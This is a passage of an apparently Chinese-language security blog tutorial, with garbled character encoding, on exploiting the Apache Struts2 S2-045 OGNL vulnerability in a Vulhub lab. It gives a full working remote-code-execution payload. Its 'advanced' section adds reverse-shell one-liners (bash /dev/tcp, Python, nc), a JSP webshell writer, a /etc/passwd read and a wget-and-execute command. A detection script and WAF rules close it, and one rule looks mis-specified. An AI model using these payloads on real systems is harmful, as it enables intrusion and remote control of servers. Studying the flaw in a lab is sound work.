class=\"hljs-symbol\">/Linux</span> <span class=\"hljs-operator\">+</span> BurpSuite<br>â”‚<br>â””â”€ é¶æœºï¼ˆKali VMï¼‰<br>   â”œâ”€ <span class=\"hljs-params\">IP:</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.102</span><br>   â”œâ”€ Docker <span class=\"hljs-operator\">+</span> Vulhub<br>   â””â”€ Struts2 App (Port <span class=\"hljs-number\">8080</span>)<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"Dockerç¯å¢ƒéƒ¨ç½²\"><a href=\"#Dockerç¯å¢ƒéƒ¨ç½²\" class=\"headerlink\" title=\"Dockerç¯å¢ƒéƒ¨ç½²\"></a>Dockerç¯å¢ƒéƒ¨ç½²</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 1. å…‹éš†Vulhubé¡¹ç›®</span><br>git <span class=\"hljs-built_in\">clone</span> https://github.com/vulhub/vulhub.git<br><br><span class=\"hljs-comment\"># 2. è¿›å…¥S2-045ç›®å½•</span><br><span class=\"hljs-built_in\">cd</span> vulhub/struts2/s2-045<br><br><span class=\"hljs-comment\"># 3. å¯åŠ¨é¶åœº</span><br>docker-compose up -d<br><br><span class=\"hljs-comment\"># 4. éªŒè¯å®¹å™¨çŠ¶æ€</span><br>docker ps -a<br></code></pre></td></tr></table></figure>\n\n<p><strong>é¢„æœŸè¾“å‡º</strong>:</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-attribute\">CONTAINER</span> ID   IMAGE                   COMMAND       CREATED     STATUS      PORTS                    NAMES<br><span class=\"hljs-attribute\">2363a15cda30</span>   vulhub/struts2:<span class=\"hljs-number\">2</span>.<span class=\"hljs-number\">3</span>.<span class=\"hljs-number\">30</span>   <span class=\"hljs-string\">&quot;mvn-server&quot;</span> <span class=\"hljs-number\">2</span>min ago   Up <span class=\"hljs-number\">2</span>min     <span class=\"hljs-number\">0.0.0.0:8080</span>-&gt;<span class=\"hljs-number\">8080</span>/tcp  s2-<span class=\"hljs-number\">045</span>-struts2-<span class=\"hljs-number\">1</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"ç¯å¢ƒéªŒè¯\"><a href=\"#ç¯å¢ƒéªŒè¯\" class=\"headerlink\" title=\"ç¯å¢ƒéªŒè¯\"></a>ç¯å¢ƒéªŒè¯</h3><p>è®¿é—® <code>http://192.168.56.102:8080/</code> åº”è¯¥èƒ½çœ‹åˆ°Struts2é»˜è®¤é¡µé¢ã€‚</p>\n<h2 id=\"æ¼æ´åˆ©ç”¨å®æˆ˜\"><a href=\"#æ¼æ´åˆ©ç”¨å®æˆ˜\" class=\"headerlink\" title=\"æ¼æ´åˆ©ç”¨å®æˆ˜\"></a>æ¼æ´åˆ©ç”¨å®æˆ˜</h2><h3 id=\"Payloadæ„é€ åŸç†\"><a href=\"#Payloadæ„é€ åŸç†\" class=\"headerlink\" title=\"Payloadæ„é€ åŸç†\"></a>Payloadæ„é€ åŸç†</h3><p>æ¶æ„Content-Typeçš„æ ¸å¿ƒç»“æ„ï¼š</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs css\"><span class=\"hljs-attribute\">Content</span>-Type: %&#123;OGNL_EXPRESSION&#125;<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"å®Œæ•´æ”»å‡»è½½è·\"><a href=\"#å®Œæ•´æ”»å‡»è½½è·\" class=\"headerlink\" title=\"å®Œæ•´æ”»å‡»è½½è·\"></a>å®Œæ•´æ”»å‡»è½½è·</h3><figure class=\"highlight smalltalk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs smalltalk\"><span class=\"hljs-type\">GET</span> / <span class=\"hljs-type\">HTTP</span>/<span class=\"hljs-number\">1.1</span><br><span class=\"hljs-type\">Host</span>: <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.102</span>:<span class=\"hljs-number\">8080</span><br><span class=\"hljs-type\">User</span>-<span class=\"hljs-type\">Agent</span>: <span class=\"hljs-type\">Mozilla</span>/<span class=\"hljs-number\">5.0</span> (compatible; <span class=\"hljs-type\">MSIE</span> <span class=\"hljs-number\">9.0</span>; <span class=\"hljs-type\">Windows</span> <span class=\"hljs-type\">NT</span> <span class=\"hljs-number\">6.1</span>; <span class=\"hljs-type\">Win64</span>; x64)<br><span class=\"hljs-type\">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class=\"hljs-number\">0.9</span>,*/*;q=<span class=\"hljs-number\">0.8</span><br><span class=\"hljs-type\">Connection</span>: close<br><span class=\"hljs-type\">Content</span>-<span class=\"hljs-type\">Type</span>: %&#123;<br>    (<span class=\"hljs-symbol\">#nike</span>=<span class=\"hljs-string\">&#x27;multipart/form-data&#x27;</span>).<br>    (<span class=\"hljs-symbol\">#dm</span>=@ognl.<span class=\"hljs-type\">OgnlContext</span>@<span class=\"hljs-type\">DEFAULT_MEMBER_ACCESS</span>).<br>    (<span class=\"hljs-symbol\">#_memberAccess</span>?(<span class=\"hljs-symbol\">#_memberAccess</span>=<span class=\"hljs-symbol\">#dm</span>):(<br>        (<span class=\"hljs-symbol\">#container</span>=<span class=\"hljs-symbol\">#context</span>[<span class=\"hljs-string\">&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;</span>]).<br>        (<span class=\"hljs-symbol\">#ognlUtil</span>=<span class=\"hljs-symbol\">#container</span>.getInstance(@com.opensymphony.xwork2.ognl.<span class=\"hljs-type\">OgnlUtil</span>@class)).<br>        (<span class=\"hljs-symbol\">#ognlUtil</span>.getExcludedPackageNames().clear()).<br>        (<span class=\"hljs-symbol\">#ognlUtil</span>.getExcludedClasses().clear()).<br>        (<span class=\"hljs-symbol\">#context</span>.setMemberAccess(<span class=\"hljs-symbol\">#dm</span>))<br>    )).<br>    (<span class=\"hljs-symbol\">#cmd</span>=<span class=\"hljs-string\">&#x27;whoami&#x27;</span>).<br>    (<span class=\"hljs-symbol\">#iswin</span>=(@java.lang.<span class=\"hljs-type\">System</span>@getProperty(<span class=\"hljs-string\">&#x27;os.name&#x27;</span>).toLowerCase().contains(<span class=\"hljs-string\">&#x27;win&#x27;</span>))).<br>    (<span class=\"hljs-symbol\">#cmds</span>=(<span class=\"hljs-symbol\">#iswin</span>?&#123;<span class=\"hljs-string\">&#x27;cmd.exe&#x27;</span>,<span class=\"hljs-string\">&#x27;/c&#x27;</span>,<span class=\"hljs-symbol\">#cmd</span>&#125;:&#123;<span class=\"hljs-string\">&#x27;/bin/bash&#x27;</span>,<span class=\"hljs-string\">&#x27;-c&#x27;</span>,<span class=\"hljs-symbol\">#cmd</span>&#125;)).<br>    (<span class=\"hljs-symbol\">#p</span>=new java.lang.<span class=\"hljs-type\">ProcessBuilder</span>(<span class=\"hljs-symbol\">#cmds</span>)).<br>    (<span class=\"hljs-symbol\">#p</span>.redirectErrorStream(<span class=\"hljs-keyword\">true</span>)).<br>    (<span class=\"hljs-symbol\">#process</span>=<span class=\"hljs-symbol\">#p</span>.start()).<br>    (<span class=\"hljs-symbol\">#ros</span>=(@org.apache.struts2.<span class=\"hljs-type\">ServletActionContext</span>@getResponse().getOutputStream())).<br>    (@org.apache.commons.io.<span class=\"hljs-type\">IOUtils</span>@copy(<span class=\"hljs-symbol\">#process</span>.getInputStream(),<span class=\"hljs-symbol\">#ros</span>)).<br>    (<span class=\"hljs-symbol\">#ros</span>.flush())<br>&#125;<br><span class=\"hljs-type\">Content</span>-<span class=\"hljs-type\">Length</span>: <span class=\"hljs-number\">0</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"Payloadé€è¡Œè§£æ\"><a href=\"#Payloadé€è¡Œè§£æ\" class=\"headerlink\" title=\"Payloadé€è¡Œè§£æ\"></a>Payloadé€è¡Œè§£æ</h3><table>\n<thead>\n<tr>\n<th>è¡¨è¾¾å¼ç‰‡æ®µ</th>\n<th>åŠŸèƒ½è¯´æ˜</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>#nike=&#39;multipart/form-data&#39;</code></td>\n<td>è®¾ç½®ä¼ªè£…çš„Content-Type</td>\n</tr>\n<tr>\n<td><code>#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS</code></td>\n<td>è·å–é»˜è®¤æˆå‘˜è®¿é—®æƒé™</td>\n</tr>\n<tr>\n<td><code>#_memberAccess=#dm</code></td>\n<td>ç»•è¿‡Struts2çš„å®‰å…¨é™åˆ¶</td>\n</tr>\n<tr>\n<td><code>#container=#context[...]</code></td>\n<td>è·å–ActionContextå®¹å™¨</td>\n</tr>\n<tr>\n<td><code>#ognlUtil.getExcludedPackageNames().clear()</code></td>\n<td>æ¸…é™¤åŒ…åé»‘åå•</td>\n</tr>\n<tr>\n<td><code>#ognlUtil.getExcludedClasses().clear()</code></td>\n<td>æ¸…é™¤ç±»åé»‘åå•</td>\n</tr>\n<tr>\n<td><code>#cmd=&#39;whoami&#39;</code></td>\n<td>å®šä¹‰è¦æ‰§è¡Œçš„å‘½ä»¤</td>\n</tr>\n<tr>\n<td><code>#iswin=...contains(&#39;win&#39;)</code></td>\n<td>åˆ¤æ–­æ“ä½œç³»ç»Ÿç±»å‹</td>\n</tr>\n<tr>\n<td><code>#cmds=(#iswin?&#123;...&#125;:&#123;...&#125;)</code></td>\n<td>æ ¹æ®ç³»ç»Ÿç±»å‹æ„é€ å‘½ä»¤å‚æ•°</td>\n</tr>\n<tr>\n<td><code>#p=new ProcessBuilder(#cmds)</code></td>\n<td>åˆ›å»ºè¿›ç¨‹æ„å»ºå™¨</td>\n</tr>\n<tr>\n<td><code>#process=#p.start()</code></td>\n<td>å¯åŠ¨è¿›ç¨‹æ‰§è¡Œå‘½ä»¤</td>\n</tr>\n<tr>\n<td><code>IOUtils@copy(...)</code></td>\n<td>å°†å‘½ä»¤è¾“å‡ºå†™å…¥HTTPå“åº”</td>\n</tr>\n</tbody></table>\n<h3 id=\"æ”»å‡»æ•ˆæœæ¼”ç¤º\"><a href=\"#æ”»å‡»æ•ˆæœæ¼”ç¤º\" class=\"headerlink\" title=\"æ”»å‡»æ•ˆæœæ¼”ç¤º\"></a>æ”»å‡»æ•ˆæœæ¼”ç¤º</h3><p><strong>è¯·æ±‚å‘é€åçš„å“åº”</strong>:</p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs http\"><span class=\"hljs-meta\">HTTP/1.1</span> <span class=\"hljs-number\">200</span> OK<br><span class=\"hljs-attribute\">Server</span><span class=\"hljs-punctuation\">: </span>Apache-Coyote/1.1<br><span class=\"hljs-attribute\">Content-Type</span><span class=\"hljs-punctuation\">: </span>text/html;charset=UTF-8<br><span class=\"hljs-attribute\">Content-Length</span><span class=\"hljs-punctuation\">: </span>9<br><span class=\"hljs-attribute\">Date</span><span class=\"hljs-punctuation\">: </span>Wed, 24 Jul 2025 08:30:45 GMT<br><span class=\"hljs-attribute\">Connection</span><span class=\"hljs-punctuation\">: </span>close<br><br><span class=\"language-haskell\"><span class=\"hljs-title\">www</span>-<span class=\"hljs-class\"><span class=\"hljs-keyword\">data</span></span></span><br></code></pre></td></tr></table></figure>\n\n<h2 id=\"é«˜çº§åˆ©ç”¨æŠ€å·§\"><a href=\"#é«˜çº§åˆ©ç”¨æŠ€å·§\" class=\"headerlink\" title=\"é«˜çº§åˆ©ç”¨æŠ€å·§\"></a>é«˜çº§åˆ©ç”¨æŠ€å·§</h2><h3 id=\"1-ä¿¡æ¯æ”¶é›†å‘½ä»¤\"><a href=\"#1-ä¿¡æ¯æ”¶é›†å‘½ä»¤\" class=\"headerlink\" title=\"1. ä¿¡æ¯æ”¶é›†å‘½ä»¤\"></a>1. ä¿¡æ¯æ”¶é›†å‘½ä»¤</h3><figure class=\"highlight autoit\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs autoit\"><span class=\"hljs-meta\"># ç³»ç»Ÿä¿¡æ¯</span><br><span class=\"hljs-meta\">#cmd=<span class=\"hljs-string\">&#x27;uname -a&#x27;</span></span><br><br><span class=\"hljs-meta\"># å½“å‰ç”¨æˆ·</span><br><span class=\"hljs-meta\">#cmd=<span class=\"hljs-string\">&#x27;id&#x27;</span></span><br><br><span class=\"hljs-meta\"># ç½‘ç»œé…ç½®</span><br><span class=\"hljs-meta\">#cmd=<span class=\"hljs-string\">&#x27;ifconfig&#x27;</span></span><br><br><span class=\"hljs-meta\"># è¿›ç¨‹åˆ—è¡¨</span><br><span class=\"hljs-meta\">#cmd=<span class=\"hljs-string\">&#x27;ps aux&#x27;</span></span><br><br><span class=\"hljs-meta\"># æ–‡ä»¶ç³»ç»Ÿ</span><br><span class=\"hljs-meta\">#cmd=<span class=\"hljs-string\">&#x27;ls -la /&#x27;</span></span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"2-åå¼¹Shell\"><a href=\"#2-åå¼¹Shell\" class=\"headerlink\" title=\"2. åå¼¹Shell\"></a>2. åå¼¹Shell</h3><figure class=\"highlight hsp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs hsp\"><span class=\"hljs-meta\"># Bashåå¼¹Shell</span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">cmd</span>=&#x27;bash -i &gt;&amp; /dev/tcp/<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.1</span>/<span class=\"hljs-number\">4444</span> <span class=\"hljs-number\">0</span>&gt;&amp;<span class=\"hljs-number\">1</span>&#x27;</span><br><br><span class=\"hljs-meta\"># Pythonåå¼¹Shell</span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">cmd</span>=&#x27;python -c <span class=\"hljs-string\">&quot;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\&quot;192.168.56.1\\&quot;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\&quot;/bin/sh\\&quot;,\\&quot;-i\\&quot;]);&quot;</span>&#x27;</span><br><br><span class=\"hljs-meta\"># NCåå¼¹Shell  </span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">cmd</span>=&#x27;nc -e /bin/sh <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.1</span> <span class=\"hljs-number\">4444</span>&#x27;</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"3-æ–‡ä»¶æ“ä½œ\"><a href=\"#3-æ–‡ä»¶æ“ä½œ\" class=\"headerlink\" title=\"3. æ–‡ä»¶æ“ä½œ\"></a>3. æ–‡ä»¶æ“ä½œ</h3><figure class=\"highlight hsp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs hsp\"><span class=\"hljs-meta\"># è¯»å–æ•æ„Ÿæ–‡ä»¶</span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">cmd</span>=&#x27;cat /etc/passwd&#x27;</span><br><br><span class=\"hljs-meta\"># å†™å…¥WebShell</span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">cmd</span>=&#x27;echo <span class=\"hljs-string\">&quot;&lt;%@ page import=\\&quot;java.io.*\\&quot; %&gt;&lt;% String cmd = request.getParameter(\\&quot;cmd\\&quot;); Process p = Runtime.getRuntime().exec(cmd); %&gt;&quot;</span> &gt; /tmp/shell.jsp&#x27;</span><br><br><span class=\"hljs-meta\"># ä¸‹è½½æ–‡ä»¶</span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">cmd</span>=&#x27;wget http:<span class=\"hljs-comment\">//192.168.56.1:8000/shell.sh -O /tmp/shell.sh &amp;&amp; chmod +x /tmp/shell.sh &amp;&amp; /tmp/shell.sh&#x27;</span></span><br></code></pre></td></tr></table></figure>\n\n<h2 id=\"æ£€æµ‹ä¸é˜²æŠ¤\"><a href=\"#æ£€æµ‹ä¸é˜²æŠ¤\" class=\"headerlink\" title=\"æ£€æµ‹ä¸é˜²æŠ¤\"></a>æ£€æµ‹ä¸é˜²æŠ¤</h2><h3 id=\"æ¼æ´æ£€æµ‹è„šæœ¬\"><a href=\"#æ¼æ´æ£€æµ‹è„šæœ¬\" class=\"headerlink\" title=\"æ¼æ´æ£€æµ‹è„šæœ¬\"></a>æ¼æ´æ£€æµ‹è„šæœ¬</h3><figure class=\"highlight livescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs livescript\"><span class=\"hljs-comment\">#!/usr/bin/env python3</span><br><span class=\"hljs-keyword\">import</span> requests<br><span class=\"hljs-keyword\">import</span> sys<br><br>def check_s2_045(url):<br>    payload = <span class=\"hljs-string\">&quot;&quot;&quot;%&#123;</span><br><span class=\"hljs-string\">        (<span class=\"hljs-subst\">#nike</span>=&#x27;multipart/form-data&#x27;).</span><br><span class=\"hljs-string\">        (<span class=\"hljs-subst\">#dm</span>=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).</span><br><span class=\"hljs-string\">        (<span class=\"hljs-subst\">#_memberAccess</span>?(<span class=\"hljs-subst\">#_memberAccess</span>=<span class=\"hljs-subst\">#dm</span>):(</span><br><span class=\"hljs-string\">            (<span class=\"hljs-subst\">#container</span>=<span class=\"hljs-subst\">#context</span>[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).</span><br><span class=\"hljs-string\">            (<span class=\"hljs-subst\">#ognlUtil</span>=<span class=\"hljs-subst\">#container</span>.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).</span><br><span class=\"hljs-string\">            (<span class=\"hljs-subst\">#ognlUtil</span>.getExcludedPackageNames().clear()).</span><br><span class=\"hljs-string\">            (<span class=\"hljs-subst\">#ognlUtil</span>.getExcludedClasses().clear()).</span><br><span class=\"hljs-string\">            (<span class=\"hljs-subst\">#context</span>.setMemberAccess(<span class=\"hljs-subst\">#dm</span>))</span><br><span class=\"hljs-string\">        )).</span><br><span class=\"hljs-string\">        (<span class=\"hljs-subst\">#cmd</span>=&#x27;echo &quot;S2045_VULN_TEST&quot;&#x27;).</span><br><span class=\"hljs-string\">        (<span class=\"hljs-subst\">#iswin</span>=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).</span><br><span class=\"hljs-string\">        (<span class=\"hljs-subst\">#cmds</span>=(<span class=\"hljs-subst\">#iswin</span>?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,<span class=\"hljs-subst\">#cmd</span>&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,<span class=\"hljs-subst\">#cmd</span>&#125;)).</span><br><span class=\"hljs-string\">        (<span class=\"hljs-subst\">#p</span>=new java.lang.ProcessBuilder(<span class=\"hljs-subst\">#cmds</span>)).</span><br><span class=\"hljs-string\">        (<span class=\"hljs-subst\">#p</span>.redirectErrorStream(true)).</span><br><span class=\"hljs-string\">        (<span class=\"hljs-subst\">#process</span>=<span class=\"hljs-subst\">#p</span>.start()).</span><br><span class=\"hljs-string\">        (<span class=\"hljs-subst\">#ros</span>=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).</span><br><span class=\"hljs-string\">        (@org.apache.commons.io.IOUtils@copy(<span class=\"hljs-subst\">#process</span>.getInputStream(),<span class=\"hljs-subst\">#ros</span>)).</span><br><span class=\"hljs-string\">        (<span class=\"hljs-subst\">#ros</span>.flush())</span><br><span class=\"hljs-string\">    &#125;&quot;&quot;&quot;</span><br>    <br>    headers = &#123;<br>        <span class=\"hljs-string\">&#x27;Content-Type&#x27;</span>: payload,<br>        <span class=\"hljs-string\">&#x27;User-Agent&#x27;</span>: <span class=\"hljs-string\">&#x27;Mozilla/5.0 (compatible; S2-045-Scanner)&#x27;</span><br>    &#125;<br>    <br>    try:<br>        response = requests.get(url, headers=headers, timeout=<span class=\"hljs-number\">10</span>)<br>        <span class=\"hljs-keyword\">if</span> <span class=\"hljs-string\">&quot;S2045_VULN_TEST&quot;</span> <span class=\"hljs-keyword\">in</span> response.text:<br>            <span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">&quot;[+] &#123;url&#125; is vulnerable to S2-045!&quot;</span>)<br>            <span class=\"hljs-keyword\">return</span> True<br>        else:<br>            <span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">&quot;[-] &#123;url&#125; is not vulnerable to S2-045&quot;</span>)<br>            <span class=\"hljs-keyword\">return</span> False<br>    except Exception <span class=\"hljs-keyword\">as</span> e:<br>        <span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">&quot;[!] Error testing &#123;url&#125;: &#123;str(e)&#125;&quot;</span>)<br>        <span class=\"hljs-keyword\">return</span> False<br><br><span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">&quot;__main__&quot;</span>:<br>    <span class=\"hljs-keyword\">if</span> len(sys.argv) != <span class=\"hljs-number\">2</span>:<br>        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&quot;Usage: python3 s2-045-check.py &lt;URL&gt;&quot;</span>)<br>        sys.exit(<span class=\"hljs-number\">1</span>)<br>    <br>    target_url = sys.argv[<span class=\"hljs-number\">1</span>]<br>    check_s2_045(target_url)<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"å®‰å…¨é˜²æŠ¤æªæ–½\"><a href=\"#å®‰å…¨é˜²æŠ¤æªæ–½\" class=\"headerlink\" title=\"å®‰å…¨é˜²æŠ¤æªæ–½\"></a>å®‰å…¨é˜²æŠ¤æªæ–½</h3><h4 id=\"1-ç‰ˆæœ¬å‡çº§ï¼ˆæ ¹æœ¬è§£å†³æ–¹æ¡ˆï¼‰\"><a href=\"#1-ç‰ˆæœ¬å‡çº§ï¼ˆæ ¹æœ¬è§£å†³æ–¹æ¡ˆï¼‰\" class=\"headerlink\" title=\"1. ç‰ˆæœ¬å‡çº§ï¼ˆæ ¹æœ¬è§£å†³æ–¹æ¡ˆï¼‰\"></a>1. ç‰ˆæœ¬å‡çº§ï¼ˆæ ¹æœ¬è§£å†³æ–¹æ¡ˆï¼‰</h4><figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-comment\"># å‡çº§åˆ°å®‰å…¨ç‰ˆæœ¬</span><br><span class=\"hljs-attribute\">Apache</span> Struts <span class=\"hljs-number\">2</span>.<span class=\"hljs-number\">3</span>.<span class=\"hljs-number\">32</span>+ æˆ– <span class=\"hljs-number\">2.5.10.1</span>+<br></code></pre></td></tr></table></figure>\n\n<h4 id=\"2-WAFè§„åˆ™é…ç½®\"><a href=\"#2-WAFè§„åˆ™é…ç½®\" class=\"headerlink\" title=\"2. WAFè§„åˆ™é…ç½®\"></a>2. WAFè§„åˆ™é…ç½®</h4><p><strong>ModSecurityè§„åˆ™</strong>:</p>\n<figure class=\"highlight 1c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs 1c\"><span class=\"hljs-meta\"># æ£€æµ‹S2-045æ”»å‡»ç‰¹å¾</span><br>SecRule REQUEST_HEADERS<span class=\"hljs-punctuation\">:</span>Content<span class=\"hljs-punctuation\">-</span>Type <span class=\"hljs-string\">&quot;@detectSQLi&quot;</span> \\<br>    <span class=\"hljs-string\">&quot;id:1001,\\</span><br>    phase<span class=\"hljs-punctuation\">:</span><span class=\"hljs-number\">1</span><span class=\"hljs-punctuation\">,</span>\\<br>    block<span class=\"hljs-punctuation\">,</span>\\<br>    msg<span class=\"hljs-punctuation\">:</span>&#x27;Struts2 S2-045 Attack Detected&#x27;<span class=\"hljs-punctuation\">,</span>\\<br>    logdata<span class=\"hljs-punctuation\">:</span>&#x27;Content-Type: %&#123;MATCHED_VAR&#125;&#x27;<span class=\"hljs-punctuation\">,</span>\\<br>    tag<span class=\"hljs-punctuation\">:</span>&#x27;attack-sqli&#x27;<span class=\"hljs-punctuation\">,</span>\\<br>    tag<span class=\"hljs-punctuation\">:</span>&#x27;OWASP_CRS/WEB_ATTACK/SQL_INJECTION&#x27;<span class=\"hljs-string\">&quot;</span><br><br><span class=\"hljs-meta\"># æ£€æµ‹OGNLè¡¨è¾¾å¼</span><br>SecRule REQUEST_HEADERS<span class=\"hljs-punctuation\">:</span>Content<span class=\"hljs-punctuation\">-</span>Type <span class=\"hljs-string\">&quot;@contains %&#123;&quot;</span> \\<br>    <span class=\"hljs-string\">&quot;id:1002,\\</span><br>    phase<span class=\"hljs-punctuation\">:</span><span class=\"hljs-number\">1</span><span class=\"hljs-punctuation\">,</span>\\<br>    block<span class=\"hljs-punctuation\">,</span>\\<br>    msg<span class=\"hljs-punctuation\">:</span>&#x27;Potential OGNL Injection in Content-Type&#x27;<span class=\"hljs-string\">&quot;</span><br></code></pre></td></tr></table></figure>\n\n<h4 id=\"3-ç½‘ç»œå±‚é˜²æŠ¤\"><a href=\"#3-ç½‘ç»œå±‚é˜²æŠ¤\" class=\"headerlink\" title=\"3. ç½‘ç»œå±‚é˜²æŠ¤\"></a>3. ç½‘ç»œå±‚é˜²æŠ¤</h4><figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs css\"># iptablesè§„åˆ™ç¤ºä¾‹<br>iptables -<span 